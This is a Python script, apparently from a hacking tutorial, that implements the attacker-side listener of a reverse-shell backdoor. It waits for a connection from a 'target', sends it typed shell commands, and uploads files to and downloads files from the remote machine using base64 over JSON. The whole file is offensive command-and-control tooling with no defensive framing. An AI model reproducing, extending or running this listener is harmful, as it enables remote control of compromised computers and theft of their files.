#!/usr/bin/python

import socket
import json
import sys
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections...")
        self.connection, address = listener.accept()
        print("[+] Connection established with... " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            sys.exit("[+] Quitting program")
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content)) # Using base64 due to encoding error
            return "[+] Download successful.."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())  # Encoding with base64 due to encoding error

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command) # Sends the command to receiving target
                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error while handling command"

            print(result)


print("[+] Please enter source-ip and port")
args = [input("Enter source-ip: "), input("Enter port number: ")]
my_listener = Listener(args[0], int(args[1]))
my_listener.run()